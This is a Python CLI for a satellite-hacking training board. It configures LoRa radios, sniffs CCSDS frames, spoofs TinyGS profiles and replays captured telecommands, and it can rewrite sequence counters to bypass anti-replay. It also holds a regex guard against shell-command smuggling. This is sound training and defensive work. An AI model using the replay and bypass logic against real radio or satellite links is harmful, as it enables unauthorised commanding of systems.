"""
cli.py - Centralized FlatSat CLI implementation.

Mirrors the Electronic Cats CatSniffer architecture (catnip/modules/core/cli.py):
all Click commands, option decorators, groups, and subcommands are consolidated
in this single cohesive file.
"""

import importlib.util
import json
import os
import platform
import re
import struct
import subprocess
import sys
import time
from datetime import datetime
from pathlib import Path

import click

from modules.core.constants import (
    APID_TC_BROADCAST,
    APID_TC_DIAG_MEM,
    APID_TC_GS_AUTH_XOR,
    APID_TC_REPLAY,
    APID_TC_RESETC,
    APID_TC_SET_THRUSTER,
    TC_OP_NOP,
    TC_OP_SET_DEBUG,
    TC_OP_SET_NOMINAL,
    TC_OP_SET_SAFE_MODE,
    XOR_KEY,
)
from modules.core.session import (
    DEVICE_HELP,
    PORT_HELP,
    flatsat_get_devices,
    send_cmd,
    with_device,
)
from modules.core.shell_parser import parse_difficulty, parse_mode
from modules.utils._version import __version__
from modules.utils.banner import print_banner
from modules.utils.output import (
    print_dim,
    print_empty_line,
    print_error,
    print_info,
    print_response,
    print_success,
    print_title,
    print_warning,
)
from modules.utils.tables import print_devices_table

# Force UTF-8 encoding on Windows to prevent UnicodeEncodeError in terminals
if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding="utf-8")
        sys.stderr.reconfigure(encoding="utf-8")
    except Exception:
        pass


# Shortest frame `replay --modify-seq` can handle: 4 primary-header bytes
# holding the sequence counter plus the 2 CRC trailer bytes. Anything shorter
# is rejected on load instead of blowing up inside struct.unpack.
_MIN_FRAME_BYTES = 6

# Several commands build one shell string by interpolation, so an option value
# must not contain whitespace or control characters; otherwise a single CLI
# invocation could smuggle extra commands to the board.
_SHELL_SAFE_RE = re.compile(r"^[A-Za-z0-9_.\-]+$")


def _fail(message):
    """Report a fatal problem through the normal UI and exit non-zero.

    Commands must not fall off the end returning 0 after something went wrong:
    scripts, CI jobs and the installer rely on the exit status to tell a
    completed operation from a failed one.
    """
    print_error(message)
    raise click.exceptions.Exit(1)


def _validate_shell_safe(ctx, param, value):
    """Click callback rejecting values that could inject extra shell commands."""
    if value is None:
        return value
    if not _SHELL_SAFE_RE.match(value):
        raise click.BadParameter(
            "may only contain letters, digits, '.', '_' and '-' "
            "(the value is sent verbatim to the board's shell)",
            ctx=ctx,
            param=param,
        )
    return value


class ApidType(click.ParamType):
    """A CCSDS APID: 11 bits, conventionally written in hexadecimal.

    click's IntRange only parses decimal, but `flatsat tc 0x04 ...` is how APIDs
    are written everywhere else in this tool, so both forms are accepted.
    """

    name = "APID"

    def convert(self, value, param, ctx):
        if isinstance(value, int):
            parsed = value
        else:
            text = str(value).strip()
            try:
                parsed = int(text, 16) if text.lower().startswith("0x") else int(text, 10)
            except ValueError:
                self.fail(f"{value!r} is not a valid APID (use decimal or 0x hex).", param, ctx)

        if not 0 <= parsed <= 0x7FF:
            self.fail(f"APID {parsed} is out of range (0..0x7FF).", param, ctx)
        return parsed


# ==============================================================================
# ROOT CLICK GROUP
# ==============================================================================

@click.group("flatsat", context_settings={"help_option_names": ["-h", "--help"]})
@click.version_option(__version__, "-V", "--version", prog_name="flatsat")
@click.option("-d", "--device", default=None, help=DEVICE_HELP)
@click.option("-p", "--port", default=None, help=PORT_HELP)
@click.pass_context
def cli(ctx, device, port):
    """FlatSat Host CLI: manage and configure your FlatSat boards easily."""
    ctx.obj = {"device": device, "port": port}


# ==============================================================================
# DEVICE & SYSTEM COMMANDS
# ==============================================================================

@cli.command("devices")
def devices():
    """List all connected FlatSat boards and their endpoints"""
    devs = flatsat_get_devices()
    if not devs:
        print_title("CONNECTED FLATSAT DEVICES")
        print_warning("No FlatSat devices detected.")
        return

    print_devices_table(devs)


@cli.command("status")
@with_device
def status(dev):
    """Read system status and firmware information"""
    print_title("SYSTEM STATUS")
    fw_version = send_cmd(dev, "fw_version")
    state = send_cmd(dev, "status")
    if fw_version:
        print_response(fw_version.strip())
    if state:
        print_response(state.strip())
    if not fw_version and not state:
        _fail("No status response received from board.")


@cli.command("sensors")
@with_device
def sensors(dev):
    """Read live telemetry data from BME280 and LIS2DH sensors"""
    print_title("TELEMETRY SENSORS")
    output = send_cmd(dev, "sensors")
    if output:
        print_response(output.strip())
    else:
        _fail("Failed to retrieve sensor values.")


@cli.command("color")
@click.argument("r", type=click.IntRange(0, 255))
@click.argument("g", type=click.IntRange(0, 255))
@click.argument("b", type=click.IntRange(0, 255))
@with_device
def color(dev, r, g, b):
    """Set custom RGB color on the NeoPixel LED

    Each channel takes a value from 0 to 255:

    \b
        flatsat color 255 0 0
    """
    output = send_cmd(dev, f"color {r} {g} {b}")
    print_info(output.strip() if output else "RGB color set.")


@cli.command("difficulty")
@click.argument("value", required=False, type=click.IntRange(0, 3))
@with_device
def difficulty(dev, value):
    """Get or set workshop security/difficulty level"""
    if value is not None:
        output = send_cmd(dev, f"difficulty {value}")
        print_info(output.strip() if output else f"Security Level set to {value}")
    else:
        output = send_cmd(dev, "difficulty")
        print_info(f"Security Level: {output.strip() if output else '(no response)'}")


@cli.command("identify")
@with_device
def identify(dev):
    """Trigger board LED identification blink"""
    print_info("Identifying FlatSat board (blinking LEDs)...")
    send_cmd(dev, "identify")
    time.sleep(2.2)
    print_success("LED identification sequence completed.")


@cli.command("reboot")
@with_device
def reboot(dev):
    """Reboot the board into the BOOTSEL bootloader"""
    print_info("Rebooting device into BOOTSEL bootloader mode...")
    dev.send_shell_command("reboot", timeout=0.2)
    print_success("Command sent. Device should disconnect shortly.")


@cli.command("cmd")
@click.argument("raw")
@with_device
def cmd(dev, raw):
    """Send a raw shell command to the FlatSat console

    \b
        flatsat cmd "lora_config"
    """
    output = send_cmd(dev, raw)
    if output:
        print_response(output.strip())
    else:
        _fail(f"No response received from board for '{raw}'.")


@cli.command("console")
@with_device
def console_cmd(dev):
    """Open a persistent interactive serial console session with the FlatSat board."""
    print_success("Connected to FlatSat interactive console.")
    print_info("Type any command (e.g. status, identify, mode gs, flight nominal) and press Enter.")
    print_info("Type 'exit' or 'quit' to close the session.")
    print_empty_line()

    while True:
        try:
            prompt_str = "flatsat> "
            try:
                user_input = input(prompt_str)
            except (KeyboardInterrupt, EOFError):
                print_empty_line()
                print_info("Closing interactive console session...")
                break

            cmd_str = user_input.strip()
            if not cmd_str:
                continue

            if cmd_str.lower() in ("exit", "quit", "q"):
                print_info("Closing interactive console session...")
                break

            if cmd_str.lower() == "identify":
                print_info("Identifying FlatSat board (blinking LEDs)...")
                send_cmd(dev, "identify")
                time.sleep(2.2)
                print_success("LED identification sequence completed.")
                continue

            output = send_cmd(dev, cmd_str)
            if output:
                print_response(output)
            else:
                print_warning(f"No response received for '{cmd_str}'.")

        except Exception as e:
            print_warning(f"Console error: {e}")
            break


# ==============================================================================
# SATELLITE & RADIO CONFIGURATION COMMANDS
# ==============================================================================

# Canonical mode -> shell sequence. The `sat`/`gs`/`tinygs` spellings accepted by
# the `mode` command are aliases, normalised to these keys by MODE_ALIASES.
MODE_SEQUENCES = {
    "mission": ["mode sat", "lora_mode ALL stream", "lora_apply ALL"],
    "ground_station": ["mode gs", "lora_mode ALL command", "lora_apply ALL"],
    "raw": ["mode gs", "lora_mode ALL stream", "lora_apply ALL"],
}

# Spellings the user may type that map onto a MODE_SEQUENCES key. "tinygs" is
# handled separately because it spoofs a profile instead of setting radios.
MODE_ALIASES = {"sat": "mission", "gs": "ground_station"}


@cli.command("mode")
@click.argument(
    "value",
    required=False,
    type=click.Choice(["mission", "sat", "ground_station", "gs", "raw", "tinygs"]),
)
@click.option(
    "--profile",
    default="norbi",
    show_default=True,
    callback=_validate_shell_safe,
    help="TinyGS profile to spoof (only with 'tinygs').",
)
@with_device
def mode(dev, value, profile):
    """Get or set satellite operation mode

    \b
        flatsat mode mission          # satellite role (radios stream)
        flatsat mode ground_station   # ground station role (radios command)
        flatsat mode raw              # gs firmware, radios stream
        flatsat mode tinygs --profile norbi
    """
    if not value:
        output = send_cmd(dev, "mode")
        if not output:
            output = send_cmd(dev, "status")
        print_info(f"Current role: {output.strip() if output else '(no response)'}")
        return

    if value == "tinygs":
        send_cmd(dev, "lora_mode ALL stream")
        output = send_cmd(dev, f"tinygs spoof {profile}")
        print_success(f"TinyGS spoofing '{profile}': {output.strip() if output else 'OK'}")
    else:
        canonical = MODE_ALIASES.get(value, value)
        for c in MODE_SEQUENCES[canonical]:
            output = send_cmd(dev, c)
            print_info(f"{c} -> {output.strip() if output else 'OK'}")
        print_success(f"Mode set to '{value}'.")

    print_info("Identifying the board that changed mode (blinking LEDs)...")
    ident = send_cmd(dev, "identify")
    if ident:
        print_info(ident.strip())


FLIGHT_STATES = ["idle", "nominal", "safe", "debug"]
FLIGHT_OPCODES = {
    "idle": TC_OP_NOP,
    "nominal": TC_OP_SET_NOMINAL,
    "safe": TC_OP_SET_SAFE_MODE,
    "debug": TC_OP_SET_DEBUG,
}


def _detect_local_role(dev):
    """Classify the attached board as "satellite", "ground_station" or "unknown".

    "unknown" is returned whenever the `mode`/`status` queries do not answer
    clearly. `flight` relies on this to choose between setting the state on the
    board in front of the user and transmitting a telecommand over RF, so
    failing open to "ground_station" would silently radio-command the satellite
    when a query merely timed out. The caller decides what to do instead.
    """
    mode_raw = dev.send_shell_command_full("mode")
    status_raw = dev.send_shell_command_full("status")
    m = parse_mode(mode_raw)

    # An explicit mode from the firmware is authoritative.
    if m in ("satellite", "mission"):
        return "satellite"
    if m == "ground_station":
        return "ground_station"
    if m == "raw":
        # Raw is GS firmware with streaming radios; the radio state separates
        # a listening satellite from an uplink-capable ground station.
        if status_raw and "mode=command" in status_raw:
            return "ground_station"
        if status_raw and "mode=stream" in status_raw:
            return "raw"
        return "unknown"

    # The mode query did not answer (old firmware, transient timeout). Fall
    # back to the radio state, which is unambiguous when it is present at all.
    if status_raw and "mode=command" in status_raw:
        return "ground_station"
    if status_raw and "mode=stream" in status_raw:
        return "unknown"

    # A board with no uplink radio can only beacon telemetry down.
    if not getattr(dev, "has_radio1", True):
        return "satellite"

    return "unknown"


def _send_flight_over_rf(dev, value, difficulty):
    from modules.core.ccsds import sdls_protect_frame
    from modules.core.radio_bridge import RadioBridge
    from modules.core.state import GroundStationState
    from modules.core.telecommand import build_command_tc

    frame = build_command_tc(FLIGHT_OPCODES[value])
    frame = sdls_protect_frame(frame, difficulty)

    gs = GroundStationState()
    gs.set_hardware(dev)
    gs.difficulty = difficulty

    return RadioBridge(gs).send_raw(frame)


@cli.command("flight")
@click.argument("value", required=False, type=click.Choice(FLIGHT_STATES))
@click.option(
    "--difficulty",
    "difficulty_override",
    type=click.IntRange(0, 3),
    default=None,
    help="SDLS level for the RF telecommand (ground station only). Defaults to the board's difficulty.",
)
@click.option(
    "--role",
    "role_override",
    type=click.Choice(["satellite", "ground_station"]),
    default=None,
    help="Skip local role detection and act as this role.",
)
@with_device
def flight(dev, value, difficulty_override, role_override):
    """Get or set flight operational state (idle, nominal, safe, debug)

    \b
        flatsat flight                    # query current flight state
        flatsat flight nominal            # satellite: set connected board to NOMINAL
        flatsat flight nominal            # ground station: send NOMINAL as an RF telecommand
        flatsat flight safe --difficulty 3
    """
    if not value:
        output = send_cmd(dev, "flight")
        print_info(f"Flight State: {output.strip() if output else '(no response)'}")
        return

    role = role_override if role_override else _detect_local_role(dev)

    if role == "unknown":
        _fail(
            "Could not tell whether this board is a satellite or a ground station "
            "(the 'mode'/'status' queries did not answer), and guessing would risk "
            "radio-commanding the satellite instead of this board. "
            "Re-run with --role satellite (set locally) or --role ground_station (transmit over RF)."
        )

    if role != "ground_station":
        output = send_cmd(dev, f"flight {value}")
        print_success(f"Flight state set to '{value}': {output.strip() if output else 'OK'}")
        return

    if difficulty_override is not None:
        diff = difficulty_override
    else:
        diff = parse_difficulty(dev.send_shell_command_full("difficulty"))

    print_info(f"Ground station detected. Sending flight TC '{value}' over RF (SDLS level {diff})...")
    result = _send_flight_over_rf(dev, value, diff)

    if result.get("status") == "error":
        _fail(f"Flight TC failed: {result.get('error')}")

    if result.get("status") == "sent":
        detail = f" ({result.get('bytes', 0)} bytes, {result.get('response', 'OK')})"
    else:
        detail = ""
    print_success(f"Flight TC '{value}' transmitted over RF{detail}.")
    if result.get("status") == "sent_simulated":
        print_warning("Transmitted in simulated mode (no radio hardware).")


def _fmt_cfg(res):
    return res.strip() if res else "OK"


@cli.command("config")
@click.option(
    "--radio",
    type=click.Choice(["0", "1", "ALL", "all"]),
    default="0",
    show_default=True,
    help="Radio index to configure (0, 1, or ALL)",
)
@click.option("--freq", type=int, help="LoRa frequency in Hz (e.g. 915000000)")
@click.option("--sf", type=click.IntRange(7, 12), help="Spreading Factor (7-12)")
@click.option("--bw", type=click.Choice(["125", "250", "500"]), help="Bandwidth in kHz")
@click.option("--cr", type=click.IntRange(5, 8), help="Coding Rate (5-8)")
@click.option("--power", type=click.IntRange(-9, 22), help="TX power in dBm (-9 to 22)")
@click.option("--preamble", type=click.IntRange(6, 65535), help="Preamble length (6-65535)")
@click.option("--iq", type=click.Choice(["normal", "inverted"]), help="IQ polarity")
@click.option("--syncword", callback=_validate_shell_safe,
              help="Syncword (public, private, or hex value e.g. 0x2D)")
@click.option("--mode", type=click.Choice(["stream", "command"]), help="LoRa output mode (applied immediately)")
@click.option("--apply", is_flag=True, help="Apply staged changes immediately")
@with_device
def config(dev, radio, freq, sf, bw, cr, power, preamble, iq, syncword, mode, apply):
    """Stage and apply LoRa radio configuration settings

    \b
        flatsat config --radio 0 --freq 915000000 --sf 7 --apply
    """
    rp = f"R{radio}" if radio in ("0", "1") else "ALL"
    print_title(f"RADIO CONFIGURATION - TARGET {rp}")

    print_info(f"Configuring target {rp}")

    staged = False
    if freq is not None:
        res = send_cmd(dev, f"lora_freq {rp} {freq}")
        print_dim(f"Frequency        -> {freq} Hz: {_fmt_cfg(res)}")
        staged = True
    if sf is not None:
        res = send_cmd(dev, f"lora_sf {rp} {sf}")
        print_dim(f"Spreading Factor -> SF{sf}: {_fmt_cfg(res)}")
        staged = True
    if bw is not None:
        res = send_cmd(dev, f"lora_bw {rp} {bw}")
        print_dim(f"Bandwidth        -> {bw} kHz: {_fmt_cfg(res)}")
        staged = True
    if cr is not None:
        res = send_cmd(dev, f"lora_cr {rp} {cr}")
        print_dim(f"Coding Rate      -> 4/{cr}: {_fmt_cfg(res)}")
        staged = True
    if power is not None:
        res = send_cmd(dev, f"lora_power {rp} {power}")
        print_dim(f"Power            -> {power} dBm: {_fmt_cfg(res)}")
        staged = True
    if preamble is not None:
        res = send_cmd(dev, f"lora_preamble {rp} {preamble}")
        print_dim(f"Preamble         -> {preamble}: {_fmt_cfg(res)}")
        staged = True
    if iq is not None:
        res = send_cmd(dev, f"lora_iq {rp} {iq}")
        print_dim(f"IQ Polarity      -> {iq}: {_fmt_cfg(res)}")
        staged = True
    if syncword is not None:
        res = send_cmd(dev, f"lora_syncword {rp} {syncword}")
        print_dim(f"Syncword         -> {syncword}: {_fmt_cfg(res)}")
        staged = True
    if mode is not None:
        res = send_cmd(dev, f"lora_mode {rp} {mode}")
        print_success(f"Mode (Immediate) -> {mode}: {_fmt_cfg(res)}")

    if apply or staged:
        if apply:
            apply_res = send_cmd(dev, f"lora_apply {rp}")
            print_success(f"Applying changes: {_fmt_cfg(apply_res)}")
        else:
            print_warning("Changes are STAGED but not yet applied. Run with --apply to write to hardware.")
    elif mode is None:
        cfg_res = send_cmd(dev, f"lora_config {rp}")
        if cfg_res:
            print_response(cfg_res.strip())


# ==============================================================================
# RF SNIFFER, REPLAY & TRANSMIT COMMANDS
# ==============================================================================

def _frame_entry(parsed_rx, difficulty):
    from modules.core.ccsds import parse_frame, sdls_unprotect_frame

    try:
        raw_bytes = bytes.fromhex(parsed_rx["data"])
    except ValueError:
        return None

    pkt = parse_frame(raw_bytes)
    if pkt is None:
        return None
    if not pkt.crc_valid and raw_bytes[-2:] != b"\x00\x00":
        return None

    if difficulty >= 2:
        raw_bytes = sdls_unprotect_frame(raw_bytes, difficulty)
        pkt = parse_frame(raw_bytes) or pkt

    return {
        "timestamp": datetime.now().isoformat(),
        "hex": raw_bytes.hex().upper(),
        "length": len(raw_bytes),
        "type": "TC" if pkt.pkt_type == 1 else "TM",
        "apid": pkt.apid,
        "seq": pkt.seq_count,
        "crc_valid": pkt.crc_valid,
        "rssi": parsed_rx.get("rssi"),
        "snr": parsed_rx.get("snr"),
    }


@cli.command("sniff")
@click.option("-r", "--radio", type=click.Choice(["0", "1"]), default="0",
              help="Radio to listen on: 0 = telemetry downlink (default), 1 = telecommand uplink.")
@click.option("-t", "--duration", type=float, default=30.0,
              help="Seconds to listen. Use 0 to run until Ctrl+C.")
@click.option("-o", "--output", type=click.Path(dir_okay=False), default=None,
              help="Write captured frames to this JSON file.")
@click.option("-n", "--count", type=click.IntRange(0), default=0,
              help="Stop after capturing this many frames (0 = no limit).")
@click.option("--difficulty", "difficulty_override", type=click.IntRange(0, 3), default=None,
              help="SDLS level used to decrypt payloads. Defaults to the target's level, sniffed from its heartbeat.")
@with_device
def sniff(dev, radio, duration, output, count, difficulty_override):
    """Sniff CCSDS frames over LoRa and optionally save them to a file

    \b
        flatsat sniff                                  # listen 30s on Radio 0
        flatsat sniff -t 0 -o capture.json             # capture until Ctrl+C
    """
    from modules.core.ccsds import detect_tm_difficulty
    from modules.core.device import parse_lora_rx

    radio_idx = int(radio)
    if radio_idx == 1 and not getattr(dev, "has_radio1", True):
        _fail("Radio 1 is not physically available on this board.")

    detected_diff = difficulty_override
    if detected_diff is None:
        try:
            detected_diff = parse_difficulty(dev.send_shell_command_full("difficulty"))
        except Exception:
            detected_diff = 0

    label = "telemetry downlink" if radio_idx == 0 else "telecommand uplink"
    limit = f", stop after {count} frames" if count else ""
    window = "until Ctrl+C" if duration <= 0 else f"for {duration:g}s"
    print_info(f"Sniffing Radio {radio_idx} ({label}) {window} (SDLS level {detected_diff}){limit}...")
    if output:
        print_info(f"Output: {output}")

    frames = []
    start = time.time()
    try:
        while duration <= 0 or time.time() - start < duration:
            line = dev.read_line_from_radio(radio_idx, timeout=1.0)
            if not line:
                continue
            parsed_rx = parse_lora_rx(line)
            if not parsed_rx:
                continue

            # Auto-detect remote satellite difficulty if not forced
            if difficulty_override is None:
                try:
                    raw_preview = bytes.fromhex(parsed_rx["data"])
                    auto_d = detect_tm_difficulty(raw_preview)
                    if auto_d is not None and auto_d != detected_diff:
                        detected_diff = auto_d
                except Exception:
                    pass

            entry = _frame_entry(parsed_rx, detected_diff if detected_diff is not None else 0)
            if not entry:
                continue
            frames.append(entry)
            rssi = entry["rssi"]
            print_success(
                f"#{len(frames)}: {entry['type']} APID=0x{entry['apid']:03X} "
                f"seq={entry['seq']} CRC={'OK' if entry['crc_valid'] else 'FAIL'} "
                f"({entry['length']} bytes"
                f"{f', RSSI {rssi}' if rssi is not None else ''})"
            )
            if count and len(frames) >= count:
                break
    except KeyboardInterrupt:
        print_warning("Sniffing stopped by user.")

    if not frames:
        _fail("No CCSDS frames captured. Is the satellite transmitting on this radio?")

    if output:
        try:
            with open(output, "w", encoding="utf-8") as f:
                json.dump({"capture_date": datetime.now().isoformat(), "frames": frames}, f, indent=2)
        except OSError as e:
            _fail(f"Failed to write {output}: {e}")
        print_success(f"Captured {len(frames)} frames -> {output}")
    else:
        print_info(f"Captured {len(frames)} frames (no --output given, nothing saved).")


def _load_frames(capture_file):
    """Return (hex_frames, skipped) parsed from a capture file.

    Accepts both the JSON written by `sniff -o` and plain text logs. Entries
    that are not even-length hex, or shorter than `_MIN_FRAME_BYTES`, are
    dropped here: `replay --modify-seq` unpacks the sequence counter at offset
    2 and rewrites the CRC, so a truncated frame would otherwise raise a bare
    struct.error from deep inside the replay loop.
    """
    from modules.core.device import parse_lora_rx

    with open(capture_file, encoding="utf-8") as f:
        content = f.read()

    entries = None
    try:
        frames = json.loads(content).get("frames")
        if isinstance(frames, list):
            entries = [e.get("hex") if isinstance(e, dict) else e for e in frames]
    except (json.JSONDecodeError, ValueError, AttributeError, TypeError):
        entries = None

    if entries is None:
        entries = []
        for line in content.splitlines():
            line_clean = line.strip()
            if not line_clean or line_clean.startswith("#"):
                continue
            parsed = parse_lora_rx(line_clean)
            if parsed:
                entries.append(parsed["data"])
            elif len(line_clean) >= 12 and all(c in "0123456789abcdefABCDEF" for c in line_clean):
                entries.append(line_clean)

    usable = []
    skipped = 0
    for entry in entries:
        clean = entry.strip() if isinstance(entry, str) else ""
        if (
            len(clean) % 2
            or len(clean) < _MIN_FRAME_BYTES * 2
            or not all(c in "0123456789abcdefABCDEF" for c in clean)
        ):
            skipped += 1
            continue
        usable.append(clean)

    return usable, skipped


def _bump_seq(frame, index):
    """Bump a frame's sequence counter and refresh its CRC.

    Raises ValueError when the frame is too short to hold a primary header, so
    callers can skip it instead of crashing on struct.error.
    """
    from modules.core.ccsds import build_seq_ctrl, ccsds_crc16, parse_seq_ctrl

    if len(frame) < _MIN_FRAME_BYTES:
        raise ValueError(f"frame is {len(frame)} bytes, need at least {_MIN_FRAME_BYTES}")

    flags, old_seq = parse_seq_ctrl(struct.unpack(">H", frame[2:4])[0])
    new_seq = (old_seq + 1000 + index) & 0x3FFF
    frame = frame[:2] + struct.pack(">H", build_seq_ctrl(new_seq, flags)) + frame[4:]
    # Update timestamp in MET secondary header if present (length >= 12)
    if len(frame) >= 12:
        now_ts = int(time.time()) & 0xFFFFFFFF
        frame = frame[:6] + struct.pack(">I", now_ts) + frame[10:]
    frame = frame[:-2] + struct.pack(">H", ccsds_crc16(frame[:-2]))
    return frame, old_seq, new_seq


@cli.command("replay")
@click.argument("capture_file", type=click.Path(exists=True, dir_okay=False))
@click.option("--delay", type=float, default=1.0, help="Seconds to wait between frames.")
@click.option("--modify-seq", is_flag=True, help="Increment sequence counters to bypass Level 3 anti-replay.")
@click.option("--difficulty", "difficulty_override", type=click.IntRange(0, 3), default=None,
              help="SDLS level applied when transmitting. Defaults to the board's difficulty.")
@with_device
def replay(dev, capture_file, delay, modify_seq, difficulty_override):
    """Replay captured CCSDS frames from a file back over RF

    \b
        flatsat replay capture.json                 # replay every frame as-is
        flatsat replay capture.json --modify-seq    # bump seq counters (bypass L3)
    """
    from modules.core.ccsds import sdls_protect_frame
    from modules.core.radio_bridge import RadioBridge
    from modules.core.state import GroundStationState

    hexes, skipped = _load_frames(capture_file)
    if skipped:
        print_warning(f"Skipped {skipped} unusable frame(s) (too short or not valid hex).")
    if not hexes:
        _fail(f"No usable frames found in {capture_file}.")

    if difficulty_override is not None:
        diff = difficulty_override
    else:
        diff = parse_difficulty(dev.send_shell_command_full("difficulty"))

    gs = GroundStationState()
    gs.set_hardware(dev)
    gs.difficulty = diff
    bridge = RadioBridge(gs)

    print_info(f"Loaded {len(hexes)} frames from {capture_file}. Replaying over RF (SDLS level {diff})...")

    sent = 0
    failed = 0
    for i, frame_hex in enumerate(hexes):
        try:
            frame = bytes.fromhex(frame_hex)
        except ValueError:
            print_warning(f"Frame {i + 1}/{len(hexes)}: invalid hex, skipping.")
            failed += 1
            continue

        if modify_seq:
            try:
                frame, old_seq, new_seq = _bump_seq(frame, i)
            except ValueError as e:
                print_warning(f"Frame {i + 1}/{len(hexes)}: {e}, skipping.")
                failed += 1
                continue
            print_info(f"Frame {i + 1}/{len(hexes)}: seq {old_seq} -> {new_seq}")

        result = bridge.send_raw(sdls_protect_frame(frame, diff))

        st = result.get("status")
        if st == "error":
            print_error(f"Frame {i + 1}/{len(hexes)}: {result.get('error')}")
            failed += 1
        elif st == "sent_simulated":
            print_warning(f"Frame {i + 1}/{len(hexes)}: transmitted in simulated mode (no radio hardware).")
            sent += 1
        else:
            print_success(
                f"Frame {i + 1}/{len(hexes)}: sent "
                f"({result.get('bytes', 0)} bytes, {result.get('response', 'OK')})"
            )
            sent += 1

        if i < len(hexes) - 1:
            time.sleep(delay)

    if failed:
        print_warning(f"Replayed {sent}/{len(hexes)} frames ({failed} failed).")
        raise click.exceptions.Exit(1)

    print_success(f"Replayed {sent}/{len(hexes)} frames.")


def _encode_payload(data, as_text):
    if as_text:
        return data.encode("utf-8")
    return bytes.fromhex(data.replace(" ", ""))


@cli.command("transmit")
@click.argument("data")
@click.option("--text", "as_text", is_flag=True, help="Interpret DATA as plain ASCII/UTF-8 text instead of hex.")
@click.option("--protect", is_flag=True, help="Apply SDLS protection before transmitting.")
@click.option("--repeat", type=click.IntRange(1), default=1, show_default=True, help="Number of times to transmit.")
@click.option("--delay", type=float, default=1.0, show_default=True, help="Seconds to wait between repeats.")
@click.option("--difficulty", "difficulty_override", type=click.IntRange(0, 3), default=None,
              help="SDLS level applied when --protect is set.")
@with_device
def transmit(dev, data, as_text, protect, repeat, delay, difficulty_override):
    """Transmit a custom hex or text string over RF

    \b
        flatsat transmit 1af0c30500ab            # send a raw hex frame
        flatsat transmit --text "HELLO SAT"      # send plain ASCII bytes
    """
    from modules.core.ccsds import build_tc, parse_frame, sdls_protect_frame
    from modules.core.constants import APID_TC_COMMAND
    from modules.core.radio_bridge import RadioBridge
    from modules.core.state import GroundStationState

    try:
        raw_payload = _encode_payload(data, as_text)
    except ValueError:
        _fail("Invalid hex string. Use --text to send plain text, or pass valid hex.")

    if not raw_payload:
        _fail("Empty payload, nothing to transmit.")

    if difficulty_override is not None:
        diff = difficulty_override
    else:
        diff = parse_difficulty(dev.send_shell_command_full("difficulty"))

    gs = GroundStationState()
    gs.set_hardware(dev)
    gs.difficulty = diff
    bridge = RadioBridge(gs)

    kind = "text" if as_text else "hex"
    sdls = f" (SDLS level {diff})" if protect else " (raw, no SDLS)"
    print_info(f"Transmitting {len(raw_payload)} bytes from {kind} string over RF{sdls}...")

    sent = 0
    for i in range(repeat):
        ts = int(time.time()) & 0xFFFFFFFF
        pkt = parse_frame(raw_payload) if len(raw_payload) >= 12 else None

        if protect:
            if pkt is not None and pkt.pkt_type == 1 and pkt.sec_hdr_flag == 1:
                frame_to_send = sdls_protect_frame(raw_payload, diff)
            else:
                seq = (int(time.time() * 10) + i) & 0x3FFF or 1
                tc_frame = build_tc(APID_TC_COMMAND, raw_payload, seq_count=seq, timestamp=ts)
                frame_to_send = sdls_protect_frame(tc_frame, diff)
        else:
            frame_to_send = raw_payload

        result = bridge.send_raw(frame_to_send)
        label = f"Transmission {i + 1}/{repeat}: " if repeat > 1 else ""

        st = result.get("status")
        if st == "error":
            print_error(f"{label}{result.get('error')}")
        elif st == "sent_simulated":
            print_warning(f"{label}transmitted in simulated mode (no radio hardware).")
            sent += 1
        else:
            print_success(f"{label}sent ({result.get('bytes', 0)} bytes, {result.get('response', 'OK')})")
            sent += 1

        if i < repeat - 1:
            time.sleep(delay)

    if sent < repeat:
        print_error(f"Transmitted payload {sent}/{repeat} times.")
        raise click.exceptions.Exit(1)

    if repeat > 1:
        print_success(f"Transmitted payload {sent}/{repeat} times.")


# ==============================================================================
# RAW TELECOMMAND (arbitrary APID) AND CTF ATTACK SUITE
# ==============================================================================

def _sniff_remote_difficulty(dev, timeout: float = 5.0) -> int | None:
    """Recover the *target's* SDLS level from its heartbeat on the downlink.

    The local board's own `difficulty` is the wrong number to encrypt with:
    when two FlatSats are connected the CLI runs on the ground station while
    the frames are consumed by the satellite, and the two levels differ. The
    ground station holds the AES/XOR keys, so it can simply trial-decrypt the
    incoming heartbeat (see ccsds.detect_tm_difficulty) and read the level off
    the plaintext that falls out.

    Returns None when no usable heartbeat arrives inside `timeout` — e.g. the
    boards are not on the air, or the downlink is a different modulation.
    """
    from modules.core.ccsds import detect_tm_difficulty
    from modules.core.device import parse_lora_rx

    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        line = dev.read_line_from_radio(0, timeout=1.0)
        if line is None:
            continue
        # Anything that is not a decoded serial line means there is no CCSDS
        # downlink here to sniff; stop instead of spinning for the full window.
        if not isinstance(line, str):
            return None
        parsed = parse_lora_rx(line)
        if not parsed:
            continue
        try:
            raw = bytes.fromhex(parsed["data"])
        except ValueError:
            continue
        level = detect_tm_difficulty(raw)
        if level is not None:
            return level
    return None


def _resolve_difficulty(dev, difficulty_override, sniff: bool = True, timeout: float = 5.0):
    """Resolve the SDLS level the *target* board expects.

    Priority: explicit --difficulty, then the level sniffed off the target's
    heartbeat, then (as a last resort) the local board's own setting — which
    is only correct when a single board is both transmitter and receiver.
    """
    if difficulty_override is not None:
        return difficulty_override, "from --difficulty"
    if sniff:
        level = _sniff_remote_difficulty(dev, timeout=timeout)
        if level is not None:
            print_info(f"Target SDLS level sniffed from its downlink heartbeat: {level}")
            return level, "sniffed"
    local = parse_difficulty(dev.send_shell_command_full("difficulty"))
    print_warning(
        f"Could not sniff the target's SDLS level; falling back to this board's level ({local}). "
        f"Pass --difficulty if the target runs at a different one."
    )
    return local, "local board"


def _open_bridge(dev, difficulty):
    """Build the RF transmit path for an already-connected device."""
    from modules.core.radio_bridge import RadioBridge
    from modules.core.state import GroundStationState

    gs = GroundStationState()
    gs.set_hardware(dev)
    gs.difficulty = difficulty
    return RadioBridge(gs)


def _deliver_frame(bridge, frame, label):
    """Send one frame, reporting the outcome. Returns True when it went out."""
    result = bridge.send_raw(frame)

    if result.get("status") == "error":
        print_error(f"{label}{result.get('error')}")
        return False
    if result.get("status") == "sent_simulated":
        print_warning(f"{label}transmitted in simulated mode (no radio hardware).")
        return True

    print_success(f"{label}sent ({result.get('bytes', 0)} bytes, {result.get('response', 'OK')})")
    return True


def _report_led_expectation(apid: int) -> None:
    """Tell the operator which NeoPixel colour the target should light up.

    The firmware dispatches the CTF scenarios from the plaintext APID in the
    CCSDS primary header before any SDLS decryption, so this is exactly what a
    board that actually received the frame will show — which makes it the
    operator's only real confirmation that the uplink worked, since the SX126x
    reports "Success" as soon as the packet is queued for transmission.
    """
